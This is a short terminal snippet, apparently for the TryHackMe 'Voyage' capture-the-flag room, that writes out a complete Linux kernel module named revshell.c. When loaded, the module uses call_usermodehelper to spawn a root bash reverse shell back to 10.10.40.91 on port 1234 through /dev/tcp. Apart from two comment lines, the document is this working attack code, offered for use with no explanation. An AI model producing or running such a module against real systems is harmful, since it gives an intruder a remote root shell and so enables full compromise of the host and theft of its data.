# for tryhackme room Voyage https://tryhackme.com/room/voyage
# run below on terminal

cat > revshell.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

static int __init revshell_init(void) {
    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.40.91/1234 0>&1", NULL};
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}

static void __exit revshell_exit(void) {
    printk(KERN_INFO "Reverse shell module unloaded\n");
}

module_init(revshell_init);
module_exit(revshell_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Reverse Shell Module");
EOF
